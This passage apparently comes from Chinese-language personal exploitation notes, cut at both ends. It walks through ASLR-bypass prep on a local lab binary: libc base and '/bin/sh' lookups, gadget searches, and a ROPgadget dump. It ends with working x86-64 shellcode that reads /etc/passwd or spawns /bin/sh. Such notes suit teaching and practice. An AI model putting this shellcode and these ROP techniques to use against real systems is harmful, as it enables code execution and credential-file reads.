r9d,0x6\n 6ae:   41 b8 05 00 00 00       mov    r8d,0x5\n 6b4:   b9 04 00 00 00          mov    ecx,0x4\n 6b9:   ba 03 00 00 00          mov    edx,0x3\n 6be:   be 02 00 00 00          mov    esi,0x2\n 6c3:   bf 01 00 00 00          mov    edi,0x1\n 6c8:   e8 93 ff ff ff          call   660 <foo>\n```\n\n<!--more-->\n\n## 查找libc基地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln\n\tlinux-vdso.so.1 (0x00007ffff7ffa000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)\n```\n\n方法二:\n\n首先查找libc中某一函数的偏移，以system为例:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@\n   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5\n```\n\n或者使用ida也可以查找函数的偏移。\n\n寻找system的绝对地址：\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ p system\n$1 = {<text variable, no debug info>} 0x5d0 <system@plt>\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \nasdf\nasdf\n\n[Inferior 1 (process 7107) exited normally]\nWarning: not running or target is remote\ngdb-peda$ p system\n$2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>\n```\n\n然后就可以计算libc的基地址:\n\n>  0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000\n\n## 查找\"/bin/sh\"的偏移地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6\n0x1b3e9a\n```\n\n方法二:\n\n在ida中查找。\n\n方法三:\n\n在环境变量中查找。\n\n```shell\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x555555554739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffdde0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 100\n0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 0x7fffffffdd48 --> 0x7fffffffdde0 --> 0x1 \n0072| 0x7fffffffdd50 --> 0x0 \n0080| 0x7fffffffdd58 --> 0x0 \n0088| 0x7fffffffdd60 --> 0xe8ddf05985fd83be \n0096| 0x7fffffffdd68 --> 0xe8dde0e6894383be \n0104| 0x7fffffffdd70 --> 0x7fff00000000 \n0112| 0x7fffffffdd78 --> 0x0 \n0120| 0x7fffffffdd80 --> 0x0 \n0128| 0x7fffffffdd88 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd90 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd98 --> 0x2225ab63 \n0152| 0x7fffffffdda0 --> 0x0 \n0160| 0x7fffffffdda8 --> 0x0 \n0168| 0x7fffffffddb0 --> 0x0 \n0176| 0x7fffffffddb8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddc0 --> 0x7fffffffdde0 --> 0x1 \n0192| 0x7fffffffddc8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/100)\n0200| 0x7fffffffddd0 --> 0x7fffffffddd8 --> 0x1c \n0208| 0x7fffffffddd8 --> 0x1c \n0216| 0x7fffffffdde0 --> 0x1 \n0224| 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffddf0 --> 0x0 \n0240| 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffde00 --> 0x7fffffffe1dd (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffde08 --> 0x7fffffffe7c9 (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde10 --> 0x7fffffffe7e4 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde18 --> 0x7fffffffe806 (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde20 --> 0x7fffffffe81b (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde28 --> 0x7fffffffe833 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde30 --> 0x7fffffffe84a (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde38 --> 0x7fffffffe859 (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde40 --> 0x7fffffffe86a (\"DISPLAY=:0\")\n0320| 0x7fffffffde48 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0328| 0x7fffffffde50 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0336| 0x7fffffffde58 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0344| 0x7fffffffde60 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0352| 0x7fffffffde68 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0360| 0x7fffffffde70 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0368| 0x7fffffffde78 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0376| 0x7fffffffde80 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0384| 0x7fffffffde88 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n0392| 0x7fffffffde90 --> 0x7fffffffe96b (\"USER=tianji\")\n--More--(50/100)\n0400| 0x7fffffffde98 --> 0x7fffffffe977 (\"DESKTOP_SESSION=ubuntu\")\n0408| 0x7fffffffdea0 --> 0x7fffffffe98e (\"QT4_IM_MODULE=fcitx\")\n0416| 0x7fffffffdea8 --> 0x7fffffffe9a2 (\"TEXTDOMAINDIR=/usr/share/locale/\")\n0424| 0x7fffffffdeb0 --> 0x7fffffffe9c3 (\"GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa\")\n0432| 0x7fffffffdeb8 --> 0x7fffffffea19 (\"DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path\")\n0440| 0x7fffffffdec0 --> 0x7fffffffea4c (\"PWD=/home/tianji/Desktop/sploit/bypassaslr_1\")\n0448| 0x7fffffffdec8 --> 0x7fffffffea79 (\"LINES=24\")\n0456| 0x7fffffffded0 --> 0x7fffffffea82 (\"HOME=/home/tianji\")\n0464| 0x7fffffffded8 --> 0x7fffffffea94 (\"TEXTDOMAIN=im-config\")\n0472| 0x7fffffffdee0 --> 0x7fffffffeaa9 (\"SSH_AGENT_PID=1606\")\n0480| 0x7fffffffdee8 --> 0x7fffffffeabc (\"QT_ACCESSIBILITY=1\")\n0488| 0x7fffffffdef0 --> 0x7fffffffeacf (\"XDG_SESSION_TYPE=x11\")\n0496| 0x7fffffffdef8 --> 0x7fffffffeae4 (\"XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop\")\n0504| 0x7fffffffdf00 --> 0x7fffffffeb37 (\"XDG_SESSION_DESKTOP=ubuntu\")\n0512| 0x7fffffffdf08 --> 0x7fffffffeb52 (\"LC_ADDRESS=zh_CN.UTF-8\")\n0520| 0x7fffffffdf10 --> 0x7fffffffeb69 (\"GJS_DEBUG_OUTPUT=stderr\")\n0528| 0x7fffffffdf18 --> 0x7fffffffeb81 (\"LC_NUMERIC=zh_CN.UTF-8\")\n0536| 0x7fffffffdf20 --> 0x7fffffffeb98 (\"ALL_PROXY=socks://127.0.0.1:1080/\")\n0544| 0x7fffffffdf28 --> 0x7fffffffebba (\"no_proxy=localhost,127.0.0.0/8,::1\")\n0552| 0x7fffffffdf30 --> 0x7fffffffebdd (\"GTK_MODULES=gail:atk-bridge\")\n0560| 0x7fffffffdf38 --> 0x7fffffffebf9 (\"NO_PROXY=localhost,127.0.0.0/8,::1\")\n0568| 0x7fffffffdf40 --> 0x7fffffffec1c (\"COLUMNS=79\")\n0576| 0x7fffffffdf48 --> 0x7fffffffec27 (\"WINDOWPATH=1\")\n0584| 0x7fffffffdf50 --> 0x7fffffffec34 (\"SHELL=/bin/bash\")\n0592| 0x7fffffffdf58 --> 0x7fffffffec44 (\"VTE_VERSION=5201\")\n```\n\n我们可以看到“SHELL=/bin/bash”的地址:`0x7fffffffec34`,然后去掉`SHELL`,这样“/bin/bash”的地址就是`0x7fffffffec3a`\n\n```\ngdb-peda$ x/s 0x7fffffffec3a\n0x7fffffffec3a:\t\"/bin/bash\"\n```\n\n当然，我这里是\"/bin/bash\",所以这方法不可行。这时候，可以添加环境变量。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffddd0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 200\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 0x7fffffffdd38 --> 0x7fffffffddd0 --> 0x1 \n0072| 0x7fffffffdd40 --> 0x0 \n0080| 0x7fffffffdd48 --> 0x0 \n0088| 0x7fffffffdd50 --> 0x3e3e2b88b8ee246d \n0096| 0x7fffffffdd58 --> 0x3e3e3b37b470246d \n0104| 0x7fffffffdd60 --> 0x7fff00000000 \n0112| 0x7fffffffdd68 --> 0x0 \n0120| 0x7fffffffdd70 --> 0x0 \n0128| 0x7fffffffdd78 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd80 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd88 --> 0x22bf66c6 \n0152| 0x7fffffffdd90 --> 0x0 \n0160| 0x7fffffffdd98 --> 0x0 \n0168| 0x7fffffffdda0 --> 0x0 \n0176| 0x7fffffffdda8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddb0 --> 0x7fffffffddd0 --> 0x1 \n0192| 0x7fffffffddb8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/200)\n0200| 0x7fffffffddc0 --> 0x7fffffffddc8 --> 0x1c \n0208| 0x7fffffffddc8 --> 0x1c \n0216| 0x7fffffffddd0 --> 0x1 \n0224| 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffdde0 --> 0x0 \n0240| 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffddf0 --> 0x7fffffffe1d1 (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffddf8 --> 0x7fffffffe7bd (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde00 --> 0x7fffffffe7d8 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde08 --> 0x7fffffffe7fa (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde10 --> 0x7fffffffe80f (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde18 --> 0x7fffffffe827 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde20 --> 0x7fffffffe83e (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde28 --> 0x7fffffffe84d (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde30 --> 0x7fffffffe85e (\"DISPLAY=:0\")\n0320| 0x7fffffffde38 --> 0x7fffffffe869 (\"ABC=/bin/sh\")\n0328| 0x7fffffffde40 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0336| 0x7fffffffde48 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0344| 0x7fffffffde50 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0352| 0x7fffffffde58 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0360| 0x7fffffffde60 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0368| 0x7fffffffde68 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0376| 0x7fffffffde70 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0384| 0x7fffffffde78 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0392| 0x7fffffffde80 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n```\n\n可以看到\"/bin/sh\"的地址：`0x7fffffffe869 + 0x6 = 0x7fffffffe86e`。\n\n```\ngdb-peda$ x/s 0x7fffffffe86e\n0x7fffffffe86e:\t\"bin/sh\"\n```\n\n当然，这个方法仅限本地使用。\n\n## 反汇编代码\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"jmp rsp\"\nffe4\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"pop rdi; ret\"\n5fc3\ntianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm \"5fc3\"\n   0:    5f                       pop    edi\n   1:    c3                       ret\n```\n## 在可执行文件中找gadget\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln\n0x7f3\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............\n0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........\n0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..\n0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................\n0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....\n```\n\n可以看到5fc3的偏移位置就是: '0x7f3'\n\n方法二:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all\nGadgets information\n============================================================\n0x0000000000000707 : add bl, dh ; ret\n0x00000000000007ff : add bl, dh ; ret\n0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret\n0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret\n0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret\n0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret\n0x0000000000000788 : add byte ptr [rax], al ; leave ; ret\n0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000706 : add byte ptr [rax], al ; ret\n0x00000000000007fe : add byte ptr [rax], al ; ret\n0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret\n0x0000000000000789 : add cl, cl ; ret\n0x00000000000005a3 : add esp, 8 ; ret\n0x0000000000000809 : add esp, 8 ; ret\n0x00000000000005a2 : add rsp, 8 ; ret\n0x0000000000000808 : add rsp, 8 ; ret\n0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax\n0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax\n0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax\n0x00000000000007d9 : call qword ptr [r12 + rbx*8]\n0x00000000000007da : call qword ptr [rsp + rbx*8]\n0x00000000000005a0 : call rax\n0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret\n0x000000000000059e : je 0x5a4 ; call rax\n0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax\n0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax\n0x0000000000000664 : jmp rax\n0x00000000000006b5 : jmp rax\n0x000000000000078a : leave ; ret\n0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret\n0x0000000000000785 : mov eax, 0 ; leave ; ret\n0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]\n0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]\n0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000007f8 : nop dword ptr [rax + rax] ; ret\n0x0000000000000701 : nop dword ptr [rax] ; ret\n0x00000000000006b3 : or al, 0x5d ; jmp rax\n0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret\n0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]\n0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007f0 : pop r14 ; pop r15 ; ret\n0x00000000000007f2 : pop r15 ; ret\n0x0000000000000663 : pop rbp ; jmp rax\n0x00000000000006b4 : pop rbp ; jmp rax\n0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000000670 : pop rbp ; ret\n0x00000000000006c0 : pop rbp ; ret\n0x00000000000006ff : pop rbp ; ret\n0x00000000000007f3 : pop rdi ; ret\n0x00000000000007f1 : pop rsi ; pop r15 ; ret\n0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000005a6 : ret\n0x0000000000000671 : ret\n0x00000000000006c1 : ret\n0x0000000000000700 : ret\n0x0000000000000709 : ret\n0x0000000000000708 : ret\n0x000000000000078b : ret\n0x00000000000007df : ret\n0x00000000000007f4 : ret\n0x0000000000000801 : ret\n0x0000000000000800 : ret\n0x000000000000080c : ret\n0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret\n0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret\n0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret\n0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax\n0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax\n0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax\n0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax\n0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax\n0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax\n\nUnique gadgets found: 85\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep \"pop rdi ; ret\"\n0x00000000000007f3 : pop rdi ; ret\n```\n## shellcode编写\n\n读取/etc/passwd\n\n```\nBITS 64 \n; Author Mr.Un1k0d3r - RingZer0 Team \n; Read /etc/passwd Linux x86_64 Shellcode \n; Shellcode size 82 bytes \nglobal _start \nsection .text \n_start: \n    jmp _push_filename \n\n_readfile: \n    ; syscall open file \n    pop rdi   ; pop path value \n    ; NULL byte fix \n    xor byte [rdi + 11], 0x41 \n\n    xor rax, rax \n    add al, 2 \n    xor rsi, rsi  ; set O_RDONLY flag \n    syscall \n\n    ; syscall read file \n    sub sp, 0xfff \n    lea rsi, [rsp] \n    mov rdi, rax \n    xor rdx, rdx \n    mov dx, 0xfff   ; size to read \n    xor rax, rax \n    syscall \n\n    ; syscall write to stdout \n    xor rdi, rdi \n    add dil, 1 ; set stdout fd = 1 \n    mov rdx, rax \n    xor rax, rax \n    add al, 1 \n    syscall \n\n    ; syscall exit \n    xor rax, rax \n    add al, 60 \n    syscall \n\n_push_filename: \n    call _readfile \n    path: db \"/etc/passwdA\" \n```\n\n```\n$ nasm -f elf64 readfile.asm -o readfile.o \n$ for i in $(objdump  -d readfile.o | grep \"^ \" | cut  -f2); do echo  -n  '\\x'$i; done; echo \n\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 \n6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x \n0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ \nxc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f \n\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41 \n```\n\nexecve /bin/sh\n\n```\n.global _start\n_start:\n    xor %esi, %esi\n    # /bin//sh\n    movabs $0x68732f2f6e69622f, %rbx\n    push %rsi\n    push %rbx\n    push %rsp\n    pop %rdi\n    pushq $59\n    pop %rax\n    xor %edx, %edx\n    syscall\n```\n\n```\\\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o 